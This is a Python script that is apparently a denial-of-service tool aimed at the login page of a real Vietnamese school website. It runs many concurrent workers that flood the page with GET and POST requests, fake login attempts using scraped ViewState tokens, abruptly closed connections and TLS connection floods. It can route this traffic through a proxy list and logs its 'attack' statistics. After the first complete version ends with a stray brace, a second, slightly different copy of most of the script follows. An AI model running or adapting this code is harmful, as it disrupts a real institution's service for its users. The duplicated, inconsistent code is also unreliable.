import asyncio
import random
import time
import os
import json
import aiohttp
import ssl
import socket
import base64
import re
from urllib.parse import urlparse, urlencode
import hashlib

# Configuration
TARGET_URL = "https://truong.hcm.edu.vn/Login.aspx?returnUrl=~/default.aspx"
DURATION = int(os.getenv("DURATION", "120"))
CONCURRENCY = int(os.getenv("CONCURRENCY", "100"))
REQ_PER_SEC = int(os.getenv("REQ_PER_SEC", "20"))
PROXY_FILE = os.getenv("PROXY_FILE", "proxy.txt")
METHODS = os.getenv("METHODS", "GET,POST,LOGIN,RESET,HTTP2,TLS").split(",")

# User agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/117.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
]

# Stats
stats = {
    "success": 0,
    "error": 0,
    "bytes_sent": 0,
    "start_time": None,
    "methods": {method: 0 for method in METHODS}
}

# Load proxies
proxies = []
if PROXY_FILE and os.path.exists(PROXY_FILE):
    with open(PROXY_FILE, 'r') as f:
        proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    print(f"Loaded {len(proxies)} proxies from {PROXY_FILE}")
else:
    print(f"Proxy file {PROXY_FILE} not found. Running without proxies.")

async def get_random_proxy():
    if not proxies:
        return None
    return random.choice(proxies)

async def get_viewstate(session):
    try:
        async with session.get(TARGET_URL, ssl=False) as response:
            if response.status == 200:
                text = await response.text()
                
                # Extract ViewState
                viewstate_match = re.search(r'id="__VIEWSTATE" value="([^"]*)"', text)
                viewstate = viewstate_match.group(1) if viewstate_match else ""
                
                # Extract ViewStateGenerator
                viewstategen_match = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]*)"', text)
                viewstategen = viewstategen_match.group(1) if viewstategen_match else ""
                
                # Extract EventValidation
                eventval_match = re.search(r'id="__EVENTVALIDATION" value="([^"]*)"', text)
                eventval = eventval_match.group(1) if eventval_match else ""
                
                return {
                    "__VIEWSTATE": viewstate,
                    "__VIEWSTATEGENERATOR": viewstategen,
                    "__EVENTVALIDATION": eventval
                }
    except Exception as e:
        print(f"Error getting ViewState: {e}")
        return None

async def http_flood(session, method, url):
    global stats
    
    try:
        if method == "GET":
            async with session.get(url, ssl=False) as response:
                stats["success"] += 1
                stats["methods"][method] += 1
                stats["bytes_sent"] += len(str(response.headers))
                return response.status
        elif method == "POST":
            data = json.dumps({"data": "x" * 1024})  # 1KB payload
            async with session.post(url, data=data, ssl=False) as response:
                stats["success"] += 1
                stats["methods"][method] += 1
                stats["bytes_sent"] += len(data) + len(str(response.headers))
                return response.status
        elif method == "LOGIN":
            # Get ViewState first
            viewstate_data = await get_viewstate(session)
            if not viewstate_data:
                stats["error"] += 1
                return None
            
            # Prepare login data
            login_data = {
                "__VIEWSTATE": viewstate_data["__VIEWSTATE"],
                "__VIEWSTATEGENERATOR": viewstate_data["__VIEWSTATEGENERATOR"],
                "__EVENTVALIDATION": viewstate_data["__EVENTVALIDATION"],
                "ctl00$ContentPlaceHolder1$txtTaiKhoa": f"user_{random.randint(1000, 9999)}",
                "ctl00$ContentPlaceHolder1$txtMatKhau": f"pass_{random.randint(1000, 9999)}",
                "ctl00$ContentPlaceHolder1$btnDangNhap": "Đăng Nhập"
            }
            
            # Send login request
            async with session.post(url, data=login_data, ssl=False) as response:
                stats["success"] += 1
                stats["methods"][method] += 1
                stats["bytes_sent"] += len(str(login_data)) + len(str(response.headers))
                return response.status
        elif method == "RESET":
            # TCP reset attack
            proxy = await get_random_proxy()
            parsed_url = urlparse(url)
            request = ""
            
            if proxy:
                # Parse proxy
                proxy_url = urlparse(proxy)
                proxy_host = proxy_url.hostname
                proxy_port = proxy_url.port
                
                # Connect to proxy
                reader, writer = await asyncio.open_connection(proxy_host, proxy_port)
                
                # Send CONNECT request for HTTPS
                if parsed_url.scheme == 'https':
                    connect_request = f"CONNECT {parsed_url.hostname}:{parsed_url.port or 443} HTTP/1.1\r\nHost: {parsed_url.hostname}\r\n\r\n"
                    writer.write(connect_request.encode())
                    await writer.drain()
                    
                    # Read response
                    response = await reader.read(4096)
                    if b"200" not in response:
                        writer.close()
                        await writer.wait_closed()
                        stats["error"] += 1
                        return None
                
                # Send actual request
                request = f"RESET /Login.aspx?returnUrl=~/default.aspx HTTP/1.1\r\nHost: {parsed_url.hostname}\r\n\r\n"
                writer.write(request.encode())
                await writer.drain()
                
                # Abruptly close connection (RST)
                writer.close()
                try:
                    await writer.wait_closed()
                except:
                    pass
            else:
                # Direct connection without proxy
                reader, writer = await asyncio.open_connection(
                    parsed_url.hostname, 
                    parsed_url.port or (443 if parsed_url.scheme == 'https' else 80),
                    ssl=(parsed_url.scheme == 'https')
                )
                
                request = f"RESET /Login.aspx?returnUrl=~/default.aspx HTTP/1.1\r\nHost: {parsed_url.hostname}\r\n\r\n"
                writer.write(request.encode())
                await writer.drain()
                
                # Abruptly close connection (RST)
                writer.close()
                try:
                    await writer.wait_closed()
                except:
                    pass
            
            stats["success"] += 1
            stats["methods"][method] += 1
            stats["bytes_sent"] += len(request)
            return 499  # Custom code for connection closed
    except Exception as e:
        stats["error"] += 1
        return None

async def http2_flood(session, url):
    global stats
    
    try:
        # Force HTTP/2
        async with session.get(
            url, 
            ssl=False,
            headers={"User-Agent": random.choice(USER_AGENTS)}
        ) as response:
            stats["success"] += 1
            stats["methods"]["HTTP2"] = stats["methods"].get("HTTP2", 0) + 1
            stats["bytes_sent"] += len(str(response.headers))
            return response.status
    except Exception as e:
        stats["error"] += 1
        return None

async def tls_flood(url):
    global stats
    
    try:
        proxy = await get_random_proxy()
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
        
        if proxy:
            # Parse proxy
            proxy_url = urlparse(proxy)
            proxy_host = proxy_url.hostname
            proxy_port = proxy_url.port
            
            # Connect to proxy
            reader, writer = await asyncio.open_connection(proxy_host, proxy_port)
            
            # Send CONNECT request for HTTPS
            if parsed_url.scheme == 'https':
                connect_request = f"CONNECT {hostname}:{port} HTTP/1.1\r\nHost: {hostname}\r\n\r\n"
                writer.write(connect_request.encode())
                await writer.drain()
                
                # Read response
                response = await reader.read(4096)
                if b"200" not in response:
                    writer.close()
                    await writer.wait_closed()
                    stats["error"] += 1
                    return None
            
            # Create SSL context
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            # Upgrade to SSL if needed
            if parsed_url.scheme == 'https':
                transport = writer.get_transport()
                sock = transport.get_extra_info('socket')
                ssl_sock = ssl_context.wrap_socket(sock, server_hostname=hostname)
                reader = asyncio.StreamReader()
                protocol = asyncio.StreamReaderProtocol(reader)
                transport = await asyncio.get_event_loop().create_connection(
                    lambda: protocol, sock=ssl_sock
                )
                writer = asyncio.StreamWriter(transport[1], protocol, reader, transport[0].get_loop())
        else:
            # Direct connection without proxy
            reader, writer = await asyncio.open_connection(hostname, port, ssl=(parsed_url.scheme == 'https'))
        
        # Craft custom TLS handshake
        request = f"GET /Login.aspx?returnUrl=~/default.aspx HTTP/1.1\r\nHost: {hostname}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n"
        writer.write(request.encode())
        await writer.drain()
        
        # Read partial response
        await reader.read(1024)
        
        # Close connection
        writer.close()
        await writer.wait_closed()
        
        stats["success"] += 1
        stats["methods"]["TLS"] = stats["methods"].get("TLS", 0) + 1
        stats["bytes_sent"] += len(request)
        return 200
    except Exception as e:
        stats["error"] += 1
        return None

async def worker(session, url):
    global stats
    
    start_time = time.time()
    last_log_time = start_time
    
    while time.time() - start_time < DURATION:
        # Random method selection
        method = random.choice(METHODS)
        
        # Random delay between requests
        await asyncio.sleep(1.0 / REQ_PER_SEC)
        
        # Execute attack
        if method in ["GET", "POST", "LOGIN", "RESET"]:
            await http_flood(session, method, url)
        elif method == "HTTP2":
            await http2_flood(session, url)
        elif method == "TLS":
            await tls_flood(url)
        
        # Log progress every 10 seconds
        current_time = time.time()
        if current_time - last_log_time >= 10:
            elapsed = current_time - stats["start_time"]
            rps = stats["success"] / max(elapsed, 1)
            print(f"Stats: {stats['success']}/{stats['error']} | RPS: {rps:.1f} | Methods: {stats['methods']}")
            last_log_time = current_time

async def create_session():
    # Create connector with proxy support
    connector = aiohttp.TCPConnector(
        limit=0,
        force_close=True,
        enable_cleanup_closed=True,
        use_dns_cache=True
    )
    
    # Create session
    timeout = aiohttp.ClientTimeout(total=10)
    return aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        headers={"User-Agent": random.choice(USER_AGENTS)}
    )

async def main():
    global stats
    stats["start_time"] = time.time()
    
    print(f"Starting attack on {TARGET_URL}")
    print(f"Duration: {DURATION}s | Concurrency: {CONCURRENCY} | Methods: {METHODS}")
    
    # Create a session for each worker
    sessions = [await create_session() for _ in range(CONCURRENCY)]
    
    try:
        # Create workers
        tasks = [worker(sessions[i], TARGET_URL) for i in range(CONCURRENCY)]
        await asyncio.gather(*tasks)
    finally:
        # Close all sessions
        for session in sessions:
            await session.close()
    
    # Print final stats
    elapsed = time.time() - stats["start_time"]
    rps = stats["success"] / max(elapsed, 1)
    mb_sent = stats["bytes_sent"] / (1024 * 1024)
    
    print("\n=== Attack Complete ===")
    print(f"Target: {TARGET_URL}")
    print(f"Duration: {elapsed:.1f}s")
    print(f"Requests: {stats['success']}/{stats['error']}")
    print(f"RPS: {rps:.1f}")
    print(f"Data sent: {mb_sent:.2f} MB")
    print(f"Methods: {stats['methods']}")
    
    # Save stats to file
    with open("attack_stats.json", "w") as f:
        json.dump({
            "target": TARGET_URL,
            "duration": elapsed,
            "requests": {
                "success": stats["success"],
                "error": stats["error"]
            },
            "rps": rps,
            "data_sent_mb": mb_sent,
            "methods": stats["methods"]
        }, f)

if __name__ == "__main__":
    asyncio.run(main())}

# Load proxies
proxies = []
if PROXY_FILE and os.path.exists(PROXY_FILE):
    with open(PROXY_FILE, 'r') as f:
        proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    print(f"Loaded {len(proxies)} proxies from {PROXY_FILE}")
else:
    print(f"Proxy file {PROXY_FILE} not found. Running without proxies.")

async def get_random_proxy():
    if not proxies:
        return None
    return random.choice(proxies)

async def get_viewstate(session):
    try:
        async with session.get(TARGET_URL, ssl=False) as response:
            if response.status == 200:
                text = await response.text()
                
                # Extract ViewState
                viewstate_match = re.search(r'id="__VIEWSTATE" value="([^"]*)"', text)
                viewstate = viewstate_match.group(1) if viewstate_match else ""
                
                # Extract ViewStateGenerator
                viewstategen_match = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]*)"', text)
                viewstategen = viewstategen_match.group(1) if viewstategen_match else ""
                
                # Extract EventValidation
                eventval_match = re.search(r'id="__EVENTVALIDATION" value="([^"]*)"', text)
                eventval = eventval_match.group(1) if eventval_match else ""
                
                return {
                    "__VIEWSTATE": viewstate,
                    "__VIEWSTATEGENERATOR": viewstategen,
                    "__EVENTVALIDATION": eventval
                }
    except Exception as e:
        print(f"Error getting ViewState: {e}")
        return None

async def http_flood(session, method, url):
    global stats
    
    try:
        if method == "GET":
            async with session.get(url, ssl=False) as response:
                stats["success"] += 1
                stats["methods"][method] += 1
                stats["bytes_sent"] += len(str(response.headers))
                return response.status
        elif method == "POST":
            data = json.dumps({"data": "x" * 1024})  # 1KB payload
            async with session.post(url, data=data, ssl=False) as response:
                stats["success"] += 1
                stats["methods"][method] += 1
                stats["bytes_sent"] += len(data) + len(str(response.headers))
                return response.status
        elif method == "LOGIN":
            # Get ViewState first
            viewstate_data = await get_viewstate(session)
            if not viewstate_data:
                stats["error"] += 1
                return None
            
            # Prepare login data
            login_data = {
                "__VIEWSTATE": viewstate_data["__VIEWSTATE"],
                "__VIEWSTATEGENERATOR": viewstate_data["__VIEWSTATEGENERATOR"],
                "__EVENTVALIDATION": viewstate_data["__EVENTVALIDATION"],
                "ctl00$ContentPlaceHolder1$txtTaiKhoa": f"user_{random.randint(1000, 9999)}",
                "ctl00$ContentPlaceHolder1$txtMatKhau": f"pass_{random.randint(1000, 9999)}",
                "ctl00$ContentPlaceHolder1$btnDangNhap": "Đăng Nhập"
            }
            
            # Send login request
            async with session.post(url, data=login_data, ssl=False) as response:
                stats["success"] += 1
                stats["methods"][method] += 1
                stats["bytes_sent"] += len(str(login_data)) + len(str(response.headers))
                return response.status
        elif method == "RESET":
            # TCP reset attack
            proxy = await get_random_proxy()
            parsed_url = urlparse(url)
            
            if proxy:
                # Parse proxy
                proxy_url = urlparse(proxy)
                proxy_host = proxy_url.hostname
                proxy_port = proxy_url.port
                
                # Connect to proxy
                reader, writer = await asyncio.open_connection(proxy_host, proxy_port)
                
                # Send CONNECT request for HTTPS
                if parsed_url.scheme == 'https':
                    connect_request = f"CONNECT {parsed_url.hostname}:{parsed_url.port or 443} HTTP/1.1\r\nHost: {parsed_url.hostname}\r\n\r\n"
                    writer.write(connect_request.encode())
                    await writer.drain()
                    
                    # Read response
                    response = await reader.read(4096)
                    if b"200" not in response:
                        writer.close()
                        await writer.wait_closed()
                        stats["error"] += 1
                        return None
                
                # Send actual request
                request = f"RESET /Login.aspx?returnUrl=~/default.aspx HTTP/1.1\r\nHost: {parsed_url.hostname}\r\n\r\n"
                writer.write(request.encode())
                await writer.drain()
                
                # Abruptly close connection (RST)
                writer.close()
                try:
                    await writer.wait_closed()
                except:
                    pass
            else:
                # Direct connection without proxy
                reader, writer = await asyncio.open_connection(
                    parsed_url.hostname, 
                    parsed_url.port or (443 if parsed_url.scheme == 'https' else 80),
                    ssl=(parsed_url.scheme == 'https')
                )
                
                request = f"RESET /Login.aspx?returnUrl=~/default.aspx HTTP/1.1\r\nHost: {parsed_url.hostname}\r\n\r\n"
                writer.write(request.encode())
                await writer.drain()
                
                # Abruptly close connection (RST)
                writer.close()
                try:
                    await writer.wait_closed()
                except:
                    pass
            
            stats["success"] += 1
            stats["methods"][method] += 1
            stats["bytes_sent"] += len(request)
            return 499  # Custom code for connection closed
    except Exception as e:
        stats["error"] += 1
        return None

async def http2_flood(session, url):
    global stats
    
    try:
        # Force HTTP/2
        async with session.get(
            url, 
            ssl=False,
            headers={"User-Agent": random.choice(USER_AGENTS)}
        ) as response:
            stats["success"] += 1
            stats["methods"]["HTTP2"] = stats["methods"].get("HTTP2", 0) + 1
            stats["bytes_sent"] += len(str(response.headers))
            return response.status
    except Exception as e:
        stats["error"] += 1
        return None

async def tls_flood(url):
    global stats
    
    try:
        proxy = await get_random_proxy()
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
        
        if proxy:
            # Parse proxy
            proxy_url = urlparse(proxy)
            proxy_host = proxy_url.hostname
            proxy_port = proxy_url.port
            
            # Connect to proxy
            reader, writer = await asyncio.open_connection(proxy_host, proxy_port)
            
            # Send CONNECT request for HTTPS
            if parsed_url.scheme == 'https':
                connect_request = f"CONNECT {hostname}:{port} HTTP/1.1\r\nHost: {hostname}\r\n\r\n"
                writer.write(connect_request.encode())
                await writer.drain()
                
                # Read response
                response = await reader.read(4096)
                if b"200" not in response:
                    writer.close()
                    await writer.wait_closed()
                    stats["error"] += 1
                    return None
            
            # Create SSL context
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            # Upgrade to SSL if needed
            if parsed_url.scheme == 'https':
                transport = await asyncio.start_tls(
                    reader, writer, ssl_context, server_hostname=hostname
                )
                reader = asyncio.StreamReader()
                writer = asyncio.StreamWriter(transport, reader, None)
        else:
            # Direct connection without proxy
            reader, writer = await asyncio.open_connection(hostname, port, ssl=(parsed_url.scheme == 'https'))
        
        # Craft custom TLS handshake
        request = f"GET /Login.aspx?returnUrl=~/default.aspx HTTP/1.1\r\nHost: {hostname}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n"
        writer.write(request.encode())
        await writer.drain()
        
        # Read partial response
        await reader.read(1024)
        
        # Close connection
        writer.close()
        await writer.wait_closed()
        
        stats["success"] += 1
        stats["methods"]["TLS"] = stats["methods"].get("TLS", 0) + 1
        stats["bytes_sent"] += len(request)
        return 200
    except Exception as e:
        stats["error"] += 1
        return None

async def worker(session, url):
    global stats
    
    start_time = time.time()
    
    while time.time() - start_time < DURATION:
        # Random method selection
        method = random.choice(METHODS)
        
        # Random delay between requests
        await asyncio.sleep(1.0 / REQ_PER_SEC)
        
        # Execute attack
        if method in ["GET", "POST", "LOGIN", "RESET"]:
            await http_flood(session, method, url)
        elif method == "HTTP2":
            await http2_flood(session, url)
        elif method == "TLS":
            await tls_flood(url)
        
        # Log progress every 10 seconds
        if int(time.time()) % 10 == 0:
            elapsed = time.time() - stats["start_time"]
            rps = stats["success"] / max(elapsed, 1)
            print(f"Stats: {stats['success']}/{stats['error']} | RPS: {rps:.1f} | Methods: {stats['methods']}")

async def main():
    global stats
    stats["start_time"] = time.time()
    
    print(f"Starting attack on {TARGET_URL}")
    print(f"Duration: {DURATION}s | Concurrency: {CONCURRENCY} | Methods: {METHODS}")
    
    # Create connector with proxy support
    connector = None
    if proxies:
        connector = aiohttp.TCPConnector(limit=0, force_close=True)
    
    # Create session
    timeout = aiohttp.ClientTimeout(total=10)
    session = aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        headers={"User-Agent": random.choice(USER_AGENTS)}
    )
    
    # Create workers
    tasks = [worker(session, TARGET_URL) for _ in range(CONCURRENCY)]
    await asyncio.gather(*tasks)
    
    # Close session
    await session.close()
    
    # Print final stats
    elapsed = time.time() - stats["start_time"]
    rps = stats["success"] / max(elapsed, 1)
    mb_sent = stats["bytes_sent"] / (1024 * 1024)
    
    print("\n=== Attack Complete ===")
    print(f"Target: {TARGET_URL}")
    print(f"Duration: {elapsed:.1f}s")
    print(f"Requests: {stats['success']}/{stats['error']}")
    print(f"RPS: {rps:.1f}")
    print(f"Data sent: {mb_sent:.2f} MB")
    print(f"Methods: {stats['methods']}")
    
    # Save stats to file
    with open("attack_stats.json", "w") as f:
        json.dump({
            "target": TARGET_URL,
            "duration": elapsed,
            "requests": {
                "success": stats["success"],
                "error": stats["error"]
            },
            "rps": rps,
            "data_sent_mb": mb_sent,
            "methods": stats["methods"]
        }, f)

if __name__ == "__main__":
    asyncio.run(main())
